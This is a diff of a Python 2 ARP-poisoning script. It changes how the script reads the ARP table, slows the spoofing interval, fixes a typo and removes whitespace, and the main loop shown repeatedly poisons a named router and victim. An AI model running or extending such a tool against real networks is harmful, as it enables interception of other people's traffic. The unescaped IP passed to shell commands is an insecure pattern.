@@ -34,7 +34,7 @@ def get_MAC_from_IP(ip):
 	os.popen('ping -c 1 %s' % ip)  #run the given command in the command line
 
 	# grep with a space at the end of IP address to make sure you get a single line
-	fields = os.popen('grep "%s " /proc/net/arp' % ip).read().split()
+	fields = commands.getoutput('grep "%s " /proc/net/arp' % ip).split()
 	if len(fields) == 6 and fields[3] != "00:00:00:00:00:00":
 		return fields[3]
 	else:
@@ -78,7 +78,7 @@ def ARP_poisoning((routerIP,routerMAC),(victimIP,victimMAC),show=False):
 def main():
 	
 	times=30
-	interval=0.05
+	interval=1.5
 	print'=====================================START======================================='	
 
 			
@@ -131,7 +131,7 @@ def main():
 	
 	
 	
-	print'|\t STRTING - sending for '+str(times)+' times with intervals of '+str(interval)+'[sec]\t\t|'	
+	print'|\t STARTING! sending for '+str(times)+' times with intervals of '+str(interval)+'[sec]\t\t|'	
 	print '-------------------------------------------------------------------------------'
 	print ''
 	print ('Attacker:\tIP:'+attacker[0]+'\t\tMAC:'+	str(attacker[1]))
@@ -152,9 +152,6 @@ def main():
 	print "\t+++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
 	print ""
 
-	
-	
-
 	# i = 0 ... times-1
 	for i in xrange(times):
 		printval=str(i+1)
@@ -168,7 +165,6 @@ def main():
 		if(i==0):
 			ARP_poisoning(router,victim,True)
 
-	
 		else:	
 			ARP_poisoning(router,victim)
 		
@@ -176,8 +172,6 @@ def main():
 		time.sleep(interval)
 	print'=====================================DONE======================================='	
 	
-	
-
 	return 0
 
 if __name__ == '__main__':
